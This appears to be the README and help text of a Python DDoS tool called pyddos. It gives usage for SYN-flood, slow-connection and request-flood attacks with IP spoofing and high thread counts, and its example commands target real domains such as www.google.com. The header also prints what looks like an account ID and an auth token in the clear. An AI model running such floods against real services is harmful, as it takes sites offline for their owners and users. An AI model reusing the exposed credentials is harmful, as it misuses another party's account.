DDos python script | Script used for testing ddos | Ddos attack       
Acount ID:AC76b2bde6569c5fefb1ad2bbca8cd628d
Auth token: 71426b6771aef7b779bc123a8edba680                                                  
 Github: http://github.com/t7hm1/pyddos                               
Version:3.0

usage: python3 pyddos.py -d [target] -p [port] -T [number threads]

optional arguments:
-h, --help       show this help message and exit
-v, --version    show program's version number and exit

options:

-d <ip|domain>   Specify your target such an ip or domain name
-t <float>       Set timeout for socket
-T <int>         Set threads number for connection (default = 1000)
-p <int>         Specify port target (default = 80) |Only required with pyslow attack|
-s <int>         Set sleep time for reconnection
-i <ip address>  Specify spoofed ip unless use fake ip
-Request         Enable request target
-Synflood        Enable synflood attack
-Pyslow          Enable pyslow attack
--fakeip         Option to create fake ip if not specify spoofed ip

Example:
python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
python3 pyddos.py -d www.domain.com -s 100 -Request
python3 pyddos.py -d www.google.com -
